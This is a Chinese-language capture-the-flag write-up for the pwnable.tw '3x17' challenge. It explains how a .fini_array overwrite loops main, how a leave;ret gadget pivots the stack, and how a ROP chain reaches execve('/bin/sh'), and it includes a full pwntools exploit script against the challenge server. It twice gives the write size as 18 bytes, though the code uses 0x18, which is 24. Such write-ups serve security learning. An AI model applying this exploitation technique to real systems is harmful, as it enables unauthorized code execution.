# [Pwnable.tw] 3x17

## 程序逻辑

1. 检查程序是否第一次运行，否的话从main中返回
2. 读取addr
3. 读取data，即往addr中写data，最多18字节

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int result; // eax
  char *v4; // [rsp+8h] [rbp-28h]
  char buf[24]; // [rsp+10h] [rbp-20h] BYREF
  unsigned __int64 v6; // [rsp+28h] [rbp-8h]

  v6 = __readfsqword(0x28u);
  result = (unsigned __int8)++byte_4B9330;
  if ( byte_4B9330 == 1 )
  {
    write(1u, "addr:", 5uLL);
    read(0, buf, 0x18uLL);
    v4 = (char *)(int)sub_40EE70(buf);
    write(1u, "data:", 5uLL);
    read(0, v4, 0x18uLL);
    result = 0;
  }
  if ( __readfsqword(0x28u) != v6 )
    sub_44A3E0();
  return result;
}
```

程序保护：只开了NX

```bash
Arch:     amd64-64-little
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      No PIE (0x400000)
```

## 漏洞点

任意写，不过只有18字节

## exploitation

### 多次任意写

如果能够多次执行main函数，就能够多次任意写。每当执行第n次 (n mod 256 == 1) main函数时，就能触发一次任意写，因为此时标识main是否运行过的全局变量会由于溢出而等于1。

通过更改`.fini_array`中的函数指针，即可实现循环执行main函数。从main函数返回后，会调用`__libc_csu_fini`函数，而在这个函数中，会依次执行`.fini_array`中的函数，在正常的程序中，用户应该是通过`atexit()`函数往`.fini_array`中注册一个退出处理函数。本题中的`__libc_csu_fini`函数可以在`_start`中找到，`_start`会调用`__libc_start_main`函数，其参数就有`__libc_csu_fini`。本题中的`__libc_csu_fini`的逻辑如下：

```c
__int64 _libc_csu_fini()
{
  signed __int64 v0; // rbx

  if ( (&unk_4B4100 - (_UNKNOWN *)off_4B40F0) >> 3 )
  {
    v0 = ((&unk_4B4100 - (_UNKNOWN *)off_4B40F0) >> 3) - 1;
    do
      off_4B40F0[v0--]();                       // .fini_array
    while ( v0 != -1 );
  }
  return term_proc();
}
```

仔细观察逻辑可知，`(&unk_4B4100 - (_UNKNOWN *)off_4B40F0) >> 3 == 2`，因此此处的`.fini_array`中最多只有两个函数，若我们设置：

```c
.fini_array[0] = __libc_csu_fini;
.fini_array[1] = main;
```

即可构成`main->fini->main->fini`的循环，从而达到多次任意写的目的。

### ROP

本题的elf文件是静态链接的，因此无法做ret2libc。不过可以看到elf中有`syscall`的gadget，因此可以进行ROP。

```bash
➜  3x17 ropper -f 3x17 --instructions "syscall;" 
Instructions
============
0x00000000004022b4: syscall;
0x0000000000402818: syscall;
```

问题在于：

1. 是否可以进行栈上的返回地址以及rop chain布置？

   栈地址未知，并且暂时没有泄露栈地址的能力，因此该想法行不通

2. 能否劫持rsp到data/bss段上？

   本题中可以，在`__libc_csu_fini`中，使用rbp作为通用寄存器，并且在调用`.fini_array`中的函数前，仍有`rbp = 0x4B40F0`

   ```assembly
   .text:0000000000402960 55                            push    rbp
   .text:0000000000402961 48 8D 05 98 17 0B 00          lea     rax, unk_4B4100 
   .text:0000000000402968 48 8D 2D 81 17 0B 00          lea     rbp, off_4B40F0 # rbp = 0x4B40F0
   .text:000000000040296F 53                            push    rbx
   .text:0000000000402970 48 29 E8                      sub     rax, rbp
   .text:0000000000402973 48 83 EC 08                   sub     rsp, 8
   .text:0000000000402977 48 C1 F8 03                   sar     rax, 3
   .text:000000000040297B 74 19                         jz      short loc_402996
   
   .text:0000000000402988                               loc_402988:                             
   .text:0000000000402988 FF 54 DD 00                   call    qword ptr [rbp+rbx*8+0] # call .fini_array[i]
   .text:0000000000402988
   .text:000000000040298C 48 83 EB 01                   sub     rbx, 1
   .text:0000000000402990 48 83 FB FF                   cmp     rbx, 0FFFFFFFFFFFFFFFFh
   .text:0000000000402994 75 F2                         jnz     short loc_402988
   ```

   如果我们将rop的第一个gadget设置在`.fini_array`中，调用时就会使得rbp指向data段。现在的目的就是另rsp同样指到data段上，这个可以通过`leave`指令来实现，并且也有非常多的`leave;ret;`gadget，我们将`leave;ret;`作为第一个gadget，就能达到劫持rsp的目的。

#### ROP chain布置

我们可以先布置一个简单的rop chain，然后考虑其可行性，根据其执行结果来调整chain布局，首先：

```
|   leave;ret;  | gadget 1 | ... | gadget n |
.fini_array[0]
```

多次调用中的main结束后会调用.fini_array[0]，因此首先执行的gadget是`leave;ret;`。在此rop chain下esp的变化如下：

```python
esp = esp - 8 	# after call .fini_array[0]
esp = ebp+8 = .fini_array+8 	# after leave
esp = .fini_array+0x10 	# after ret;
# from now on, execute gadget 1, gadget2, ... gedget n respectively
```

可以发现，此时的gadget执行顺序是符合预期的，因此rop chain的布局是正确的。

#### gadget  选择

我们直接通过gadget调用`execve("/bin/sh",NULL,NULL)`，因此需要通过gadget满足：

```python
rax=0x3b	# syscall id of execve
rdi = address("/bin/sh")
rsi = 0
rdx = 0
syscall
```

此处的`address("/bin/sh")`可以使用任意写放到data段上的某处（比如.init_array）。这个rop chain可以直接使用pwntools来构造：

```python
from pwn import *
_bin = ELF("3x17")
_rop = ROP(_bin)
_rop(rdi=binsh_addr,rax=0x3b, rsi=0, rdx = 0)
_rop.raw(_rop.syscall.address)
print(_rop.dump())

"""
0x0000:         0x44a309 pop rdx; pop rsi; ret
0x0008:              0x0
0x0010:              0x0
0x0018:         0x41e4af pop rax; ret
0x0020:             0x3b
0x0028:         0x401696 pop rdi; ret
0x0030:         0x4b40e0
0x0038:         0x4022b4 syscall
"""
```

#### gadget写入顺序

注意先不要写`.fini_array[0] .fini_array[1]`的内容，这样会导致从main函数的反复调用中退出

脚本：

```python
from pwn import *
context.arch = "amd64"
context.os = "linux"
# context.log_level = "debug"
context.terminal = ["tmux", "splitw", "-h"]

def write(io, addr, data):
    io.recvuntil("addr:".encode())
    io.send(str(addr).encode())
    io.recvuntil("data:".encode())
    io.send(data)


def write_fini_array(io,idx,data):
    fini_array = 0x4b40f0
    addr = fini_array + 8 * idx
    io.recvuntil("addr:".encode())
    io.send(str(addr).encode())
    io.recvuntil("data:".encode())
    io.send(data)

def construct_rop_chain(_rop: ROP, binsh_addr):
    leave_ret_addr = 0x401c4b
    pop_rax_addr = 0x041e4af
    pop_2_reg_addr = 0x44a309
    #_rop.raw(leave_ret_addr)
    #_rop.raw(pop_2_reg_addr)
    _rop(rdi=binsh_addr,rax=0x3b, rsi=0, rdx = 0)
    _rop.raw(_rop.syscall.address)
    print(_rop.dump())
    return _rop.chain()

DEBUG = True
ip = "chall.pwnable.tw"
port = 10105



if __name__ == "__main__":
    if DEBUG:
        io = process("./3x17")
    else:
        io = remote(ip,port)
    _bin = ELF("./3x17")
    _rop = ROP(_bin)
    main_addr = 0x0401B6D
    # main_addr = 0x401B75
    # csu_ini = 0x402960
    csu_fini = 0x402961
    leave_ret = 0x401c4b
    fini_array = 0x4b40f0
    binsh_addr = fini_array - 0x10
    # rbp = fini_array
    chain = construct_rop_chain(_rop, binsh_addr)

    write_fini_array(io,0,p64(csu_fini)+p64(main_addr))

    # Layout of rop chain
    # | fini_arr 0: addr_of_chain1 | chain 0: leave;ret; | chain 1:pop rdx; pop rsi ret; | ... | chain n | ... | "/bin/sh" | 
    # Firstly wirte chain 1..n, finally chain 0
    
    # write bin sh
    # gdb.attach(io)
    write(io,binsh_addr, "/bin/sh\x00".encode())
    # gdb.attach(io)
    # write chain 1 ... chain n
    for i in range(0, len(chain[8:]), 8):
        end = min(i+8, len(chain[8:]))
        _data = chain[8:][i:end]
        _addr = fini_array + 0x10 + i 
        print(f"chain {i//8+1} at {hex(_addr)}: {_data}")
        write(io, _addr, _data)
    # write chain 0
    chain_start = fini_array + 0x10
    leave_ret_addr = 0x401c4b
    write(io, fini_array, p64(leave_ret_addr)+chain[:8])
    # write leave;ret; to fini_array[0]
    # gdb.attach(io)
    io.interactive()
```

